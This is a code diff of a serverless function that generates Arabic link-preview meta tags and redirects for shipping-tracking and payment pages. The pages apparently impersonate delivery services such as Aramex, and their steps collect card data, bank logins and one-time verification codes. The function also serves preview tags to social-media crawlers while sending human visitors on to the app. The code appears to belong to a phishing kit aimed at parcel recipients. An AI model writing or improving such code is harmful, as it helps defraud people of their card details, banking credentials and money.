@@ -132,26 +132,35 @@ async function getLinkData(linkId) {
 }
 
 exports.handler = async (event, context) => {
-  const { path, queryStringParameters } = event;
+  // Get query parameters
+  const queryStringParameters = event.queryStringParameters || {};
+  
+  // Get path from query params (if redirected) or directly from event.path
+  const originalPath = queryStringParameters.path || event.path || event.rawPath || '';
+  const queryParams = queryStringParameters;
   
   // Extract parameters from path: /r/:country/:type/:id or /pay/:id/...
-  let pathMatch = path.match(/^\/r\/([A-Z]{2})\/(shipping|chalet)\/([a-zA-Z0-9-]+)$/);
+  let pathMatch = originalPath.match(/^\/r\/([A-Z]{2})\/(shipping|chalet)\/([a-zA-Z0-9-]+)$/);
   let countryCode, type, id;
   
   if (pathMatch) {
     [, countryCode, type, id] = pathMatch;
   } else {
     // Handle payment page routes: /pay/:id/...
-    pathMatch = path.match(/^\/pay\/([a-zA-Z0-9-]+)\/(.+)$/);
+    pathMatch = originalPath.match(/^\/pay\/([a-zA-Z0-9-]+)(?:\/(.+))?$/);
     if (pathMatch) {
       [, id, subPath] = pathMatch;
       // For payment pages, we need to determine the type from the link data
       type = 'shipping'; // Default to shipping for payment pages
       countryCode = 'SA'; // Default country, will be overridden by link data
     } else {
+      // If no match, return 404
       return {
         statusCode: 404,
-        body: 'Not Found'
+        headers: {
+          'Content-Type': 'text/html; charset=utf-8',
+        },
+        body: '<html><body>Not Found</body></html>'
       };
     }
   }
@@ -182,9 +191,10 @@ exports.handler = async (event, context) => {
   }
   
   // Debug logging
+  console.log('Original Path:', originalPath);
   console.log('Link ID:', id);
   console.log('Link Data:', linkData);
-  console.log('Query Parameters:', queryStringParameters);
+  console.log('Query Parameters:', queryParams);
   console.log('Final Country:', countryCode, 'Type:', type);
   
   let title = "";
@@ -200,8 +210,8 @@ exports.handler = async (event, context) => {
     } else if (linkData?.payload?.service) {
       serviceKey = linkData.payload.service;
       console.log('Using service from payload:', serviceKey);
-    } else if (queryStringParameters?.service) {
-      serviceKey = queryStringParameters.service;
+    } else if (queryParams?.service) {
+      serviceKey = queryParams.service;
       console.log('Using service from query params:', serviceKey);
     } else {
       console.log('Using fallback service:', serviceKey);
@@ -213,12 +223,38 @@ exports.handler = async (event, context) => {
     console.log('Final service info:', { serviceKey, serviceName, serviceInfo });
     
     // Determine if this is a payment page or microsite
-    const isPaymentPage = path.startsWith('/pay/');
-    const pageType = isPaymentPage ? 'صفحة دفع آمنة' : 'تتبع وتأكيد الدفع';
+    const isPaymentPage = originalPath.startsWith('/pay/');
+    let pageType = '';
     
-    title = `${pageType} - ${serviceName}`;
-    description = `${serviceInfo.description} - ${isPaymentPage ? 'أكمل الدفع بشكل آمن ومحمي' : 'تتبع شحنتك وأكمل الدفع بشكل آمن'}`;
-    ogImage = serviceInfo.ogImage;
+    // Determine specific payment page type
+    if (isPaymentPage) {
+      if (originalPath.includes('/recipient')) {
+        pageType = 'معلومات المستلم';
+      } else if (originalPath.includes('/details')) {
+        pageType = 'تفاصيل الدفع';
+      } else if (originalPath.includes('/card-input')) {
+        pageType = 'بيانات البطاقة';
+      } else if (originalPath.includes('/bank-login')) {
+        pageType = 'تسجيل الدخول';
+      } else if (originalPath.includes('/otp')) {
+        pageType = 'رمز التحقق';
+      } else {
+        pageType = 'صفحة دفع آمنة';
+      }
+    } else {
+      pageType = 'تتبع وتأكيد الدفع';
+    }
+    
+    // Use company description as primary description
+    title = `${serviceName} - ${pageType}`;
+    description = serviceInfo.description; // Use company description prominently
+    
+    // Add page-specific context
+    if (isPaymentPage) {
+      description += ` - ${pageType}`;
+    } else {
+      description += ` - تتبع شحنتك وأكمل الدفع بشكل آمن`;
+    }
     
     // Add tracking number to description if available
     if (linkData?.payload?.tracking_number) {
@@ -229,6 +265,8 @@ exports.handler = async (event, context) => {
     if (linkData?.payload?.cod_amount && linkData.payload.cod_amount > 0) {
       description += ` - مبلغ الدفع: ${linkData.payload.cod_amount} ر.س`;
     }
+    
+    ogImage = serviceInfo.ogImage;
   } else if (type === "chalet") {
     const chaletName = linkData?.payload?.chalet_name || 'شاليه';
     const isPaymentPage = path.startsWith('/pay/');
@@ -245,12 +283,15 @@ exports.handler = async (event, context) => {
     ogImage = "/og-aramex.jpg"; // Default for chalets
   }
   
-  const siteUrl = `https://${event.headers.host}`;
-  const fullUrl = `${siteUrl}${path}${queryStringParameters ? '?' + new URLSearchParams(queryStringParameters).toString() : ''}`;
+  // Get site URL from headers or use default
+  const host = event.headers?.host || event.headers?.['host'] || event.headers?.['Host'] || 'dynamic-sunflower-49efe2.netlify.app';
+  const protocol = event.headers?.['x-forwarded-proto'] || 'https';
+  const siteUrl = `${protocol}://${host}`;
+  const fullUrl = `${siteUrl}${originalPath}${Object.keys(queryParams).filter(k => k !== 'path').length > 0 ? '?' + Object.entries(queryParams).filter(([k]) => k !== 'path').map(([k, v]) => `${k}=${encodeURIComponent(v)}`).join('&') : ''}`;
   const fullOgImage = ogImage.startsWith('http') ? ogImage : `${siteUrl}${ogImage}`;
   
   // Final debug logging
-  console.log('Final meta tags:', { title, description, ogImage, serviceKey });
+  console.log('Final meta tags:', { title, description, ogImage: fullOgImage, serviceKey, fullUrl });
   
   // Generate HTML with proper meta tags
   const html = `<!DOCTYPE html>
@@ -334,16 +375,11 @@ exports.handler = async (event, context) => {
   </div>
   
   <script>
-    // Redirect to actual app after a short delay
-    setTimeout(() => {
-      // For payment pages, redirect to the actual React app
-      if ('${path}'.startsWith('/pay/')) {
-        window.location.href = '${fullUrl}';
-      } else {
-        // For microsite pages, redirect to the actual React app
-        window.location.href = '${fullUrl}';
-      }
-    }, 2000);
+    // For bots: they read meta tags from this HTML before JS executes
+    // For users: redirect to actual React app
+    if (!navigator.userAgent.match(/(facebookexternalhit|Facebot|Twitterbot|WhatsApp|LinkedInBot|Slackbot|TelegramBot|Googlebot)/i)) {
+      window.location.href = '${fullUrl}';
+    }
   </script>
 </body>
 </html>`;
